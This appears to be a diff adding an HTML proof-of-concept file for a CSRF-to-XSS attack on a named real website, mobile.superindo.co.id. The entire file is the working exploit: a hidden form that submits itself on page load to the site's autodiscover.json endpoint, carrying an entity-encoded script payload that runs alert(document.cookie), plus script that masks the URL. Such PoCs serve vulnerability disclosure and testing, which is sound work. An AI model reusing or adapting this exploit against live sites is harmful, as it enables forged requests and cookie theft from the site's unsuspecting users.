@@ -1,0 +1,14 @@
+<html>
+  <h1>CSRF to XSS PoC at https://mobile.superindo.co.id/ </h1>
+  <body>
+    <form action="https://mobile.superindo.co.id/autodiscover/autodiscover.json" method="POST">
+      <input type="hidden" name="&lt;script&gt;alert&#40;document&#46;cookie&#41;&#59;&#32;a" value="&quot;&lt;&#47;script&gt;" />
+      <input type="hidden" name="x" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
